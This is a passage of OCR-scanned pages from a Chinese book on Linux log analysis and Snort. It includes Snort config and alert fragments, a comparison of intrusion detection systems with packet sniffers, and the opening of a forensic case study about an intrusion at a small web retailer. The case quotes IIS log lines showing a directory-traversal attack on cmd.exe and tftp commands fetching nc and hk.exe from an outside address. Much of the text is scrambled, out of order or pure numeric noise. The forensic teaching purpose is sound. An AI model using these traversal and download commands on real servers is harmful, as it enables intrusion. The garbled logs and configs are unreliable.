[**][1:486:5]ICMPDestination UnreachableCommunication withDestination Host isAdministratively
policylinuxl
imeout60\
bind_to 192.168.120.0/24
policyfirst
prealloc_frags 8192
preprocessor frag3_engine:
snort配置样例snort.conf
** END OF DUMP
(24morebytes of original packet)
Seq:0x82A7D80A
TCP TTL:128 TOS:0x0 ID:24726 IpLen:20 DgmLen:52 DF 
192.168.1.114:4913->192.168.1.188:20
**ORIGINALDATAGRAMDUMP:
ICMPTTL:255TOS:0xC0 ID:44664 IpLen:20 DgmLen:80
01/14-16:37:25.684538192.168.1.188->192.168.1.114
[Classification:Misc activity][Priority:3]
**ENDOFDUMP
(32more bytes of original packet)
Len:32Csum:26600
UDPTTL:128TOS:0x0ID:24725IpLen:20DgmLen:60
preprocessor frag3_global:
b
0城
esldriq
---
## Page 314
多。这种情况下，许多优秀的网络监听和分析工具，例如 Tcpdump、Wireshark 等工具，都
总结
难，如果没有及时更新IDS 的特征库就不能及时地跟上网络故障的变化。
出已知攻击模式，但无法处理不确定性，规则之间的关联也非常复杂，维护起来也比较困
够灵活判断分析故障来源。而IDS系统则是黑盒操作，基本上，属于被动型工作，虽能检测
病毒及新的入侵攻击有较强的发现能力，不过这也要求操作者有一定水平，能看出问题，能
仅将网络数据与自身的特征库进行匹配，判断，所以提供数据相对较少。
据及各种能够反映当前网络状况的饼图、柱状分析图等；而IDS系统由于是进行黑盒操作，
为库来匹配是不是网络入侵行为，偏重网络安全。
或安全问题，例如它能够定位故障源的 IP 或MAC 地址，而IDS 系统则是根据特征库、行
向控制台提供规则库中的攻击行为。
见的 Ntop、Xplico 以及 Sniffer Pro 就是这样。而 IDS 系统对网络数据进行特征库规则匹配，
流量分析、会话分析、矩阵连接分析、利用率分析、丢包分析、数据包大小统计分析等。常
较，
有联系。首先：
IDS系统与网络嗅探器的区别
AATools、IPTools、Landguard Network Security Scanner 等）的弱点。
具都有助于网管了解现有漏洞扫描系统（OSSIM、IntemetScanner、RetinaNetworkScanner
系统），它内置CASL，可以用来对上述的插入/逃避方面的内容进行确认性的测试，这些工
击者用同样的方法躲开NIDS。另一个是NAI的CyberCopScanner（一款商业网络安全评估
评估NIDS工具
在此次攻击事件中，使用实时的网络分析工具要比等待NIDS 计算机发出E-mail有效得
网络嗅探系统主要功能定位在捕捉并分析网络数据，从网络底层找出网络的故障、性能
2.两者主要功能不同
网络嗅探分析系统属于主动、创新的工作类型，它能发现网络异常问题，对新型蠕虫、
4.面对未知网络攻击时的工作方式不同
网络嗅探分析系统通过对网络中的数据进行详细分析并统计，能够提供详细而全面的数
3.两者提供的详细数据不同
嗅探器检测当前网卡所在网段的所有数据包，进行解码，还会对其进行统计分析，包括
有利于网络管理员快速掌握其用途。IDS系统与嗅探分析系统的区别主要在以下几点：
除了以上三点共性，它们各自的长处，主要反映在对数据的处理方式上。通过下面的比
●它们都是分析网络中的数据包。
况下会用到TAP这样的流量汇聚设备。
通常都是通过 SPAN方式获取流量，然后对这些数据包进行解码统计分析，在特定情
通常部署时都是旁路接入到网络，不必改变网络拓扑结构。
第10章Snort系统部署及应用案例291
---
## Page 315
坏，下面是IIS的部分日志内容：
他随后开始了系统的取证工作。首先他检查了Web服务器的日志，日志完整，没有被破
料，以及银行账户信息，让他不要报警…
全。一天早上，小孙突然发现一封奇怪的电子邮件，大概意思是黑客已掌握了公司客户信息资
理系统和CRM系统。为了安全起见，他还采用了Snort系统来监视整个网络，以维护网络安
网站（sandmore.com）。因为公司不大，
事件背景
洞导致攻击者成功提升了用户权限？
日志到 Snort 的日志开始分析，逐步掌握了攻击者的入侵方式和手段。你知道是什么系统漏
10.6案例十八：智取不速之客
现外部攻击者穿透内部网络等许多问题。
攻击者使用更多常规的攻击手段对网络再次进行攻击。通常，在企业内进行安全审计可以发
工作要做。例如，对每一台计算机都进行分析和测试，以确定没有被植入 rootkit。还要防备
是非常有用的。即使能在攻击者对内部系统造成严重破坏前发现攻击，接下来还有许多取证
292
这难道是一场恶作剧？不过技术人员出身的小孙当然不会屈服于这种可耻的黑客手段。
小孙是一家创业IT公司的老板，
技术员小孙面对入侵系统的不速之客，开展了一系列的日志取证工作，从IIS服务器的
UNIX/Linux网络日志分析与流量监控
IIS 日志位于C:(WINDOWS\system32\LogFiles\目录下，文件名为ex+年份的末两位数字
IIS日志说明：
故事人物：小孙（自主创业老板）
关键日志：IIS 日志、Snort 日志
难度系数：★★★★
22:10:57
2:15
22:11:05
22:10:40
22:10:27
ack
+STB+6.0
+SE+6.0
ack.co
+ESIE
CSIE+6.
+SE+6.0
SIE-6.0n
+MSIE+6.0
E+R
+MSIE+6.
+HSIE+
502
doz1l1a/4.
6.0,+indo
0+Wind
ine.com
，最近他将生意做到了网上。他维护着一个小型的在线零售
，所以小孙用了几台计算机分别作为Web服务器、财务管
C
T/scripts/../../wrinnt/system32/cmd.exe/c+dir.exe+\jackjil1\hk\hk-0.1\
/scripts/../../winnt/system32/cmd.exe
/scripts/../../wirnt/system32/cmd.exe/c+dir.exe+\jackjil1\hk\hk-0.1\200
T/acripts/../../wirnt/system32/cmdexe/c+dir.exe+\200
/scripts/../../winnt/system32/cmd.exe
ripts/../../winnt/system32/cmd.exe
/winnt/system32/cmd.exe/c+mkdir.exe+\jackji11\hk\502
e/c+dir.exe+\inetpub\scripts 200
e/c+tftp.exe+-i+10.21.2.1+GET+nc.
e/c+tftp.exe+-i+10.21.2.1+GET+hk.exe
e/c+dir.exe+\jackjil1\hk\
e/c+mkdir.exe+\jackji11\502
AT
AD
netpubwroot200
武首
OON
200
200
.cx
---
## Page 316
提取时间范围在21:00～23:59的4段日志记录：
件，可以用任何编辑器打开。在日志中可以指定每天记录客户 IP 地址、用户名、服务器端
+月份+日期.log，例如 ex13122.log表示2013年12月22号的 IIS 日志。IIS 日志都是文本文
回
口
、方法、URI 资源、URI查询、协议状态、用户代理。在上面日志中依次记录了日期、
小孙注意到，上面的最后两条记录在 IIS 日志中重复了多次。随后小孙从 Snort 日志中
第二段日志：
第一
客户机IP、服务器IP、访问端口号、方法、URI、协议状态、用户代理。
第
111
段
conections
段日志
045 3042838 78284537
日
54258552462255
Optior
志：
3201160973074227073702299990520207730332033669
Seq:
(5)
D
82184174166
D7B
ID:17
7223878703820201871656069386665603653535306946
97062141504820
19760554592077154657365204120602231650
.C
=
799463082460569
+二+二+二+二+二
13856031727820464
二二
25586760442015
十二+
Win:
二十二十二十
第10章Snort系统部署及应用案例
2579241260628506078
十二
efault
+=+=+二+=+=
1t.htm HTTP
日+=+=+=+=
ub
image/j
/sy
山
营道
号
hand
2A
T2
YTY
H2T
一
293
---
## Page 317
个可同时置为1。
疑
中志日
294
团无法角
为了读懂上面的信息，
·FIN，简写F，发送端完成发送任务。
从这
第四段日志：
UNIX/Linux网
SYN：简写S，
RST:
PSH:
ACk:
解开。
142
20676142056025747365
Snort
18102188736506980015
2
AP
简
确认序号有效。
紧急指针（Urgent 
简
4830083041017000000000000008
252078716561658866070
写R，重建连接。
写
日志文件内容来分析，小孙能感觉到发生了些什么，但他心中还是有几个
30042001556165566400000000000189
为P，接收方应该月
2440015007181683090000000000809
19297262222192
络
同步序号，用来发起
860
425090009002500455209000009000009000000008899
602027742242407366
日
MSS:
169005207308732069
志分析与
我们先回顾
40300002069588000900009000000883
1700463454520492031516
75
20614208625628 45430855
Pointer）有效。
423033555669680900000900000006
2078586648204242
流
0
992538666560365352032699
尽快将这个报文段交给应用层。
一
8B8ED8
n:20